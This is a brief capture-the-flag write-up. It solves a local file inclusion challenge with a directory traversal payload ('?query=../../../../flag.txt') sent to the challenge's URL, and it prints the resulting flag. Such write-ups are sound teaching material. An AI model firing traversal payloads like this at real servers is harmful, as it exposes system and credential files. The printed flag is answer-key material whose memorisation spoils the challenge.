# LeFI Gimang

>LeFi is an attack technique in which attackers trick a web application into either running or exposing files on a web server.

## The challenge

Given instance that contains a link to a website. This is what the homepage looks like.

## How to solve

There are few articles that can be explored. Let's try it one by one.

Aside from all available articles, `tips.txt` might be something that I can look up.

```
Result for: tips.txt

Pro tip: Searching with full paths might reveal something interesting...
```

The `tips.txt` is providing a useful tips. So I searched the browser with keywords such as 'lfi' and 'full path exploit' and found an interesting [article on Medium by Aptive](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601). 

The one that I want to highlight is how I can do directory traversal on the url. And since the web server includes the files by showing the 'query=tips.txt'. So, in other ways I can do traversal until it redirects to the flag. The payload that I use is

```
?query=../../../../../../../../flag.txt
```

And the full payload will be

```
http://d3108353-8f90-459f-a4af-d01683c0b28d.chall.intersec.hcs-team.com/?query=../../../../../../../../flag.txt
```

Let's apply the payload.

It reveals the flag.

## The flag
```
HCS{LFI_buT_n0w_y0u_us1n9_tr4v3r5AL_27e92b2b-99ec-4b1c-b3fe-b06123a522db}
